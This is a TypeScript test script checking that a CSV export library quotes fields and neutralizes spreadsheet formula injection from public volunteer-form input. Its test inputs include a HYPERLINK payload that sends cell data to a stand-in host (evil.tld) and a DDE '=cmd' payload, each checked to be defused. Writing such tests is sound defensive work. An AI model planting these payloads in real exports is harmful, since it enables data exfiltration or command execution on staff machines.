/**
 * CSV export check — RFC 4180 quoting AND spreadsheet formula neutralization.
 *
 *   npx tsx scripts/verify-csv.ts
 *
 * Sibling of verify-storage.ts / verify-pricing.ts. No database and no network:
 * this covers src/lib/csv.ts only.
 *
 * WHY THIS SCRIPT EXISTS. csv.ts already said the honest thing about itself —
 * "a report route cannot be exercised by a verification script, so the escaping
 * was the one part of an export nothing could check." That was true of the
 * ROUTE, not of the FUNCTION. Lifting the escape into lib/ made it checkable and
 * nothing had checked it, which is how three inline copies of the same escape
 * all shipped without formula neutralization and a security audit found it
 * rather than a test.
 *
 * THE THREAT THIS PINS. `name`, `school`, `counselorName` and `counselorTitle`
 * arrive from src/app/volunteer/actions.ts — a PUBLIC, UNAUTHENTICATED server
 * action — validated only as a non-empty string. They are read back by
 * /api/reports/volunteers and /api/reports/counselors, and the person who opens
 * that file is the coordinator, on the machine that also downloads the
 * reconciliation export. So a leading `=` in a volunteer's name is an attacker
 * writing a formula into a staff spreadsheet, and quoting does not stop it:
 * Excel and Sheets strip the quotes and then evaluate what is left.
 *
 * MUTATION TEST (required by CLAUDE.md — a check that cannot fail is worse than
 * none). The one-line edit that must turn this script red:
 *
 *     src/lib/csv.ts — delete the `FORMULA_LEAD.test(value) ? ... :` branch,
 *     i.e. change
 *         const v = FORMULA_LEAD.test(value) ? `'${value}` : value;
 *     to
 *         const v = value;
 *
 * That was run once and this script reported 8 of 26 FAILED — all five §1 cases,
 * both §2 cases, and the §4 toCsv composition. Restoring the branch returns it
 * to all-green. §2 alone fails if the apostrophe is applied AFTER the quoting
 * rather than before, which is the ordering bug that looks fixed and is not.
 */
import { readFileSync } from "node:fs";
import { csvEscape, toCsv } from "../src/lib/csv";

let failures = 0;
let checks = 0;

function check(label: string, ok: boolean, detail = "") {
  checks++;
  console.log(`  ${ok ? "ok  " : "FAIL"}  ${label}${detail ? ` — ${detail}` : ""}`);
  if (!ok) failures++;
}

function eq(label: string, got: string, want: string) {
  check(label, got === want, got === want ? "" : `got ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
}

console.log("\n§1 a field that a spreadsheet would evaluate is neutralized");
// One case per character in FORMULA_LEAD. These are the five that make the
// mutation above fail, so they are the load-bearing rows of this script.
eq("leading = is prefixed", csvEscape("=1+1"), "'=1+1");
eq("leading + is prefixed", csvEscape("+1"), "'+1");
eq("leading - is prefixed", csvEscape("-1"), "'-1");
eq("leading @ is prefixed", csvEscape("@SUM(A1)"), "'@SUM(A1)");
// Tab and CR are leading whitespace to a human and a cell boundary to a parser.
eq("leading tab is prefixed", csvEscape("\t=1+1"), "'\t=1+1");

console.log("\n§2 neutralization happens INSIDE the quotes, not outside");
// The real payload carries a comma and quotes, so it takes both code paths at
// once. An apostrophe emitted outside the quotes is data, not a hint, and the
// formula would still evaluate — this is the case that catches that ordering bug.
eq(
  "the exfiltration payload is defused and correctly quoted",
  csvEscape('=HYPERLINK("https://evil.tld/?x="&C2,"Verify hours")'),
  `"'=HYPERLINK(""https://evil.tld/?x=""&C2,""Verify hours"")"`,
);
check(
  "the apostrophe is inside the opening quote",
  csvEscape('=a,b').startsWith(`"'`),
  csvEscape('=a,b'),
);

console.log("\n§3 RFC 4180 quoting still behaves (the original contract)");
eq("plain text is untouched", csvEscape("Asha Menon"), "Asha Menon");
eq("a comma forces quoting", csvEscape("Menon, Asha"), '"Menon, Asha"');
eq(
  "a real entry name with quotes doubles them",
  csvEscape('Naach, "Baby" Naach'),
  '"Naach, ""Baby"" Naach"',
);
eq("a newline forces quoting", csvEscape("line1\nline2"), '"line1\nline2"');
eq("an embedded (non-leading) = is left alone", csvEscape("a=b"), "a=b");
eq("an embedded - is left alone", csvEscape("Jean-Luc"), "Jean-Luc");
eq("empty stays empty", csvEscape(""), "");

console.log("\n§4 toCsv composes the escape for every column");
const csv = toCsv(["name", "email"], [
  { name: "=cmd|'/c calc'!A1", email: "a@b.test" },
  { name: "Menon, Asha", email: "c@d.test" },
]);
const rows = csv.split("\n");
check("header is present and unquoted", rows[0] === "name,email", rows[0]);
// No comma, quote or newline in this payload, so RFC 4180 adds no quotes and the
// apostrophe leads the bare field. That is still defused — a leading apostrophe
// is the literal-text marker whether or not the field is quoted. The quoted
// variant is covered in §2.
check(
  "a formula in row 1 is defused by toCsv, not just by csvEscape",
  rows[1].startsWith(`'=cmd`),
  rows[1],
);
check("row 2 quoting survives", rows[2] === '"Menon, Asha",c@d.test', rows[2]);
// A missing key must write an empty field, not the string "undefined" — the
// existing contract, re-pinned here because §4 is the only place it is exercised.
eq(
  "a missing key writes an empty field",
  toCsv(["a", "b"], [{ a: "x" }]),
  "a,b\nx,",
);

console.log("\n§5 the three inline copies are gone");
// The gap existed because each report route carried its own escape. If one comes
// back, this script keeps passing while the export it feeds is exploitable — so
// the absence is itself the check.
for (const route of [
  "src/app/api/reports/volunteers/route.ts",
  "src/app/api/reports/counselors/route.ts",
  "src/app/api/reports/reconciliation/route.ts",
  "src/app/api/reports/performances/route.ts",
]) {
  const src = readFileSync(route, "utf8");
  check(
    `${route.split("/").slice(-2)[0]} has no local escape`,
    !/const escape\s*=/.test(src),
    "a local escape shadows lib/csv and would miss the formula prefix",
  );
  check(
    `${route.split("/").slice(-2)[0]} imports from @/lib/csv`,
    /from "@\/lib\/csv"/.test(src),
  );
}

console.log(
  failures === 0
    ? `\nAll checks passed. (${checks} assertions)\n`
    : `\n${failures} of ${checks} CHECK(S) FAILED.\n`,
);
process.exit(failures === 0 ? 0 : 1);
